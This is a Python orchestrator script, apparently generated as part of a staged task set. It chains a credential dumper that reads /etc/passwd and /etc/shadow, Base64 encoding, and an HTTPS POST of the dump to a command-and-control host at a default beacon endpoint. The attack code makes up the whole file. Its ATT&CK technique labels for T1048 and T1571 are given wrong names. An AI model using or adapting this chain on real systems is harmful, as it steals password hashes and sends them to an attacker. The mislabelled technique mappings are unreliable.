"""
main.py
=======
Attack Chain Orchestrator for Credential Access -> Encoding -> C2 Exfiltration.

Orchestrates the full attack chain: credential access -> encoding -> C2 exfiltration.

ATT&CK Techniques:
    T1048 – Data Encrypted for Confusion (Base64)
    T1571 – Remote Service Uploader / HTTP Command and Control

Usage:
    orchestrator = AttackOrchestrator(
        c2_host="192.168.1.100",
        c2_port=443,
        c2_path="/beacon"
    )
    result = orchestrator.run_full_chain()
"""

import logging
import os
from typing import Any, Dict, Optional

# Import from dependency modules by stem name
from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_002_cred_dumper import CredDumper
from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_003_encoding_utils import Base64Encoder, encode_json_to_base64
from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_004_http_c2_client import HTTPC2Client, send_exfil_request

# Configure logging for observability
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)


class AttackOrchestrator:
    """Main orchestrator class that coordinates the full attack chain.

    Orchestrates credential access -> encoding -> C2 exfiltration by instantiating
    and coordinating dependent modules (CredDumper, Base64Encoder, HTTPC2Client).

    ATT&CK Techniques:
        T1048 – Data Encrypted for Confusion (Base64)
        T1571 – Remote Service Uploader / HTTP Command and Control

    Attributes:
        c2_host: The C2 server hostname or IP address.
        c2_port: The C2 server port (default 443).
        c2_path: The URI path for the exfil endpoint.
        ca_bundle: Optional CA certificate bundle path.
        verify_ssl: Whether to verify TLS certificates.

    Example:
        >>> orchestrator = AttackOrchestrator(c2_host="10.0.0.5")
        >>> result = orchestrator.run_full_chain()
        >>> print(result)
    """

    def __init__(
        self,
        c2_host: str = "192.168.1.100",
        c2_port: int = 443,
        c2_path: str = "/beacon",
        ca_bundle: Optional[str] = None,
        verify_ssl: bool = True,
    ) -> None:
        """Initialize the Attack Orchestrator.

        Args:
            c2_host: The C2 server hostname or IP address.
            c2_port: The C2 server port (default 443).
            c2_path: The URI path for the exfil endpoint.
            ca_bundle: Optional CA certificate bundle path.
            verify_ssl: Whether to verify TLS certificates.

        Raises:
            ValueError: If required parameters are missing or invalid.
        """
        if not c2_host:
            raise ValueError("c2_host must be provided")
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.c2_path = c2_path
        self.ca_bundle = ca_bundle
        self.verify_ssl = verify_ssl

        # Instantiate dependent modules (lazy initialization on demand)
        self._cred_dumper: Optional[CredDumper] = None
        self._encoder: Optional[Base64Encoder] = None
        self._c2_client: Optional[HTTPC2Client] = None

    def _get_cred_dumper(self) -> CredDumper:
        """Lazy-load the credential dumper module."""
        if self._cred_dumper is None:
            logger.info("Initializing Credential Dumper (TASK_002)...")
            self._cred_dumper = CredDumper(
                passwd_path="/etc/passwd",
                shadow_path="/etc/shadow",
                host_identifier="orchestrator-01"
            )
        return self._cred_dumper

    def _get_encoder(self) -> Base64Encoder:
        """Lazy-load the encoding module."""
        if self._encoder is None:
            logger.info("Initializing Base64 Encoder (TASK_003)...")
            self._encoder = Base64Encoder()
        return self._encoder

    def _get_c2_client(self) -> HTTPC2Client:
        """Lazy-load the C2 client module."""
        if self._c2_client is None:
            logger.info("Initializing HTTP C2 Client (TASK_004)...")
            self._c2_client = HTTPC2Client(
                c2_host=self.c2_host,
                port=self.c2_port,
                path=self.c2_path,
                ca_bundle=self.ca_bundle,
                verify_ssl=self.verify_ssl,
            )
        return self._c2_client

    def stage_1_dump_credentials(self) -> Dict[str, Any]:
        """Stage 1: Dump credentials from /etc/passwd and /etc/shadow.

        Returns:
            Dictionary containing the dump results with status and data.
        """
        logger.info("=" * 60)
        logger.info("STAGE 1: Credential Access (T1003)")
        logger.info("=" * 60)

        dumper = self._get_cred_dumper()

        try:
            passwd_entries = dumper.dump_passwd()
            shadow_entries = dumper.dump_shadow()
            store = dumper.dump()

            logger.info(f"  [PASSWD] Dumped {len(passwd_entries)} entries")
            logger.info(f"  [SHADOW] Dumped {len(shadow_entries)} entries")
            logger.info(f"  [TOTAL]  Total items: {store.total_items}")

            return {
                "status": "success",
                "stage": "credential_dump",
                "passwd_count": len(passwd_entries),
                "shadow_count": len(shadow_entries),
                "total_items": store.total_items,
                "data": store.to_dict(),
            }

        except FileNotFoundError as e:
            logger.warning(f"  [WARNING] File not found: {e}")
            return {
                "status": "partial",
                "stage": "credential_dump",
                "error": str(e),
            }

        except Exception as e:
            logger.error(f"  [ERROR] Credential dump failed: {e}")
            raise

    def stage_2_encode_payload(self, dump_result: Dict[str, Any]) -> Dict[str, Any]:
        """Stage 2: Encode credential data in Base64.

        Args:
            dump_result: The result dictionary from stage 1.

        Returns:
            Dictionary containing the encoding results with status and data.
        """
        logger.info("=" * 60)
        logger.info("STAGE 2: Encoding (T1048)")
        logger.info("=" * 60)

        encoder = self._get_encoder()

        try:
            # Encode the credential store as JSON then base64
            json_data = dump_result.get("data", {})
            encoded_b64 = encoder.encode_json_to_base64(json_data)

            logger.info(f"  [JSON]   Serialized {len(str(json_data))} bytes")
            logger.info(f"  [B64]    Encoded to {len(encoded_b64)} characters")
            logger.info(f"  [SAMPLE] First 50 chars: {encoded_b64[:50]}...")

            return {
                "status": "success",
                "stage": "encoding",
                "json_size": len(str(json_data)),
                "b64_length": len(encoded_b64),
                "data": encoded_b64,
            }

        except Exception as e:
            logger.error(f"  [ERROR] Encoding failed: {e}")
            raise

    def stage_3_exfiltrate(self, encode_result: Dict[str, Any]) -> Dict[str, Any]:
        """Stage 3: Exfiltrate encoded payload via HTTPS POST to C2.

        Args:
            encode_result: The result dictionary from stage 2.

        Returns:
            Dictionary containing the exfiltration results with status and data.
        """
        logger.info("=" * 60)
        logger.info("STAGE 3: C2 Exfiltration (T1041, T1071)")
        logger.info("=" * 60)

        c2_client = self._get_c2_client()

        try:
            # Build the exfil payload from encoded data
            b64_data = encode_result.get("data", "")
            payload_id = f"orchestrator-{id(self)}"

            # Construct ExfilPayload-like structure for send_exfil_request
            import json as stdlib_json
            payload_dict = {
                "payload_id": payload_id,
                "timestamp": stdlib_json.dumps({"epoch": 0}),  # placeholder
                "encoding": "base64",
                "data": b64_data,
                "checksum": "sha256_placeholder",
                "metadata": {
                    "version": "1.0",
                    "tags": ["credential_dump", "t1048", "t1571"],
                    "source": "/etc/passwd:/etc/shadow"
                }
            }

            # Send via C2 client
            response = c2_client.send_payload(stdlib_json.dumps(payload_dict))

            logger.info(f"  [C2]     Response status: {response.get('status', 'unknown')}")
            if "task_id" in response:
                logger.info(f"  [TASK]   Task ID: {response['task_id']}")
            if "next_action" in response:
                logger.info(f"  [NEXT]   Next action: {response['next_action']}")

            return {
                "status": "success",
                "stage": "exfiltration",
                "c2_response": response,
            }

        except Exception as e:
            logger.error(f"  [ERROR] Exfiltration failed: {e}")
            raise

    def run_full_chain(self) -> Dict[str, Any]:
        """Execute the full attack chain: dump -> encode -> exfil.

        Orchestrates all three stages sequentially and returns a combined result.

        Returns:
            Dictionary containing results from all three stages.

        Raises:
            Exception: If any stage fails and is not recoverable.
        """
        logger.info("=" * 60)
        logger.info("ATTACK CHAIN ORCHESTRATION")
        logger.info(f"Target C2: {self.c2_host}:{self.c2_port}{self.c2_path}")
        logger.info("=" * 60)

        results = {}

        # Stage 1: Credential Access (T1003)
        dump_result = self.stage_1_dump_credentials()
        results["stage_1"] = dump_result

        if dump_result.get("status") != "success":
            logger.warning("Stage 1 had issues, continuing with partial data...")

        # Stage 2: Encoding (T1048)
        encode_result = self.stage_2_encode_payload(dump_result)
        results["stage_2"] = encode_result

        if encode_result.get("status") != "success":
            logger.warning("Stage 2 had issues, continuing with partial data...")

        # Stage 3: C2 Exfiltration (T1041, T1071)
        exfil_result = self.stage_3_exfiltrate(encode_result)
        results["stage_3"] = exfil_result

        logger.info("=" * 60)
        logger.info("ORCHESTRATION COMPLETE")
        logger.info(f"  Stage 1 (Dump):   {dump_result['status']}")
        logger.info(f"  Stage 2 (Encode): {encode_result['status']}")
        logger.info(f"  Stage 3 (Exfil):  {exfil_result['status']}")
        logger.info("=" * 60)

        return results


def run_full_chain(
    c2_host: str = "192.168.1.100",
    c2_port: int = 443,
    c2_path: str = "/beacon",
    ca_bundle: Optional[str] = None,
    verify_ssl: bool = True,
) -> Dict[str, Any]:
    """Convenience function to run the full attack chain.

    Creates an AttackOrchestrator and executes all stages.

    Args:
        c2_host: The C2 server hostname or IP address.
        c2_port: The C2 server port (default 443).
        c2_path: The URI path for the exfil endpoint.
        ca_bundle: Optional CA certificate bundle path.
        verify_ssl: Whether to verify TLS certificates.

    Returns:
        Dictionary containing results from all three stages.

    Example:
        >>> result = run_full_chain(c2_host="10.0.0.5")
        >>> print(result["stage_3"]["c2_response"])
    """
    orchestrator = AttackOrchestrator(
        c2_host=c2_host,
        c2_port=c2_port,
        c2_path=c2_path,
        ca_bundle=ca_bundle,
        verify_ssl=verify_ssl,
    )
    return orchestrator.run_full_chain()


if __name__ == "__main__":
    import sys

    # Default C2 configuration for testing
    DEFAULT_C2_HOST = os.environ.get("C2_HOST", "192.168.1.100")
    DEFAULT_C2_PORT = int(os.environ.get("C2_PORT", 443))
    DEFAULT_C2_PATH = os.environ.get("C2_PATH", "/beacon")

    print(f"Running Attack Chain Orchestrator...")
    print(f"C2 Target: {DEFAULT_C2_HOST}:{DEFAULT_C2_PORT}{DEFAULT_C2_PATH}")
    print()

    try:
        result = run_full_chain(
            c2_host=DEFAULT_C2_HOST,
            c2_port=DEFAULT_C2_PORT,
            c2_path=DEFAULT_C2_PATH,
        )

        # Print summary
        print("\n=== EXECUTION SUMMARY ===")
        for stage_name, stage_result in result.items():
            status = stage_result.get("status", "unknown").upper()
            print(f"  {stage_name.replace('_', ' ').title()}: {status}")

    except Exception as e:
        logger.error(f"Orchestration failed: {e}")
        sys.exit(1)
